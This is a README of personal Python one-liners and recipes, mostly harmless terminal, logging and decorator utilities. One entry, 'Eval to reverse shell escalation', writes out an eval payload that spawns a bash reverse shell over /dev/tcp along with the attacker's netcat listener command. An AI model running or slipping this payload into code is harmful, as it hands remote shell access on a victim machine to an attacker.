# python-snippets

A collection of various one-liners and recipes I wrote.

<details>
  <summary>Singleton</summary>
  
```python
class WhateverClass():
    def __init__(self):
        ... # Other init code here if needed
        self.__class__.__new__ = lambda _: self  # At the end of init this makes a singleton class
        self.__class__.__init__ = lambda *_, **__: None  # Prevent init from affecting the singleton more than once
```
</details>




<details>
  <summary>Eval to reverse shell escalation</summary>
  
  ```python
  eval("__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\")", locals={}, globals={})
  (attacker listens to: $ nc -lvnp 4444)
  ```
  
</details>



<details>
  <summary>Windows wakelock</summary>

```python
python -c "import ctypes,time;f=ctypes.windll.user32.keybd_event;exec('while 1:time.sleep(f(19,0,1,0)+f(19,0,3,0)<<5)')"
```

</details>



<details>
  <summary>Unix getchar</summary>

```python
import os
import termios
import tty
import sys
def getch_nix():
    """Get char, reads single character OR key combination without enter."""
    try:
        old_settings = termios.tcgetattr(sys.stdin.fileno())  # Save terminal settings.
        tty.setraw(sys.stdin.fileno())  # Terminal settings to raw mode; read w/o enter.
        char = sys.stdin.read(1)  # Read first character in blocking mode to wait input.
        os.set_blocking(sys.stdin.fileno(), False)  # Set stdin to non-blocking mode.
        return char + "".join(iter(lambda: sys.stdin.read(1), ""))  # Iter to dump buff.
    finally:  # Restore blocking mode and old terminal settings.
        os.set_blocking(sys.stdin.fileno(), True)
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, old_settings)
```

</details>


<details>
  <summary>Windows getchar</summary>

```python
import msvcrt
def getch_win():
    """Get char, reads single character OR key combination without enter."""
    # First getch call starts reading, other calls in iter dump kb buffer if non-empty.
    return msvcrt.getch() + b''.join(msvcrt.getch() for _ in iter(msvcrt.kbhit, False))
```

</details>


<details>
  <summary>Minimal logging</summary>

```python
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="%y-%m-%d %H:%M:%S %z"
)
logger = logging.getLogger()
```

</details>




<details>
  <summary>One time only function</summary>

```python
def once(func):
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        func.__code__ = (lambda *_ , **__: None).__code__
        return result
    return wrapper
```

</details>





<details>
  <summary>Mouse click support in terminal demo</summary>

```python
import os, sys, tty, termios, time, re

def term_setup():
    old_settings = termios.tcgetattr(sys.stdin.fileno())  # Store terminal settings
    tty.setraw(sys.stdin.fileno())  # Set terminal to raw mode to read without enter
    os.set_blocking(sys.stdin.fileno(), False)  # Set stdin to non-blocking mode
    print("\x1b[?1000h\x1b[?1006h", end="", flush=True)  # Enable mouse reporting
    return old_settings  # Return the old terminal settings for restoration

def term_reset(old_settings):
    print("\x1b[?1000l\x1b[?1006l", end="", flush=True)  # Disable mouse reporting
    os.set_blocking(sys.stdin.fileno(), True)  # Restore stdin blocking mode
    termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, old_settings)  # Reset term

if __name__ == "__main__":  # xterm mouse click support demo
    old_settings = term_setup()  # Register cleanup with setup return val
    print("Left click terminal for demo, right click to quit.", end="\r\n", flush=True)
    while time.sleep(0.1) is None:  # Loop until a right click is detected
        data = "".join(iter(lambda: sys.stdin.read(1), ""))  # Dump stdin buffer
        match = re.search(r"\x1b\[<(\d+);(\d+);(\d+)([mM])", data)
        button, x, y, event = match.groups() if match else ("", "", "", "")
        print(x, y, end="\r\n", flush=True) if button == "0" and event == "M" else None
        (term_reset(old_settings) or exit()) if button == "2" and event == "m" else None

```

</details>
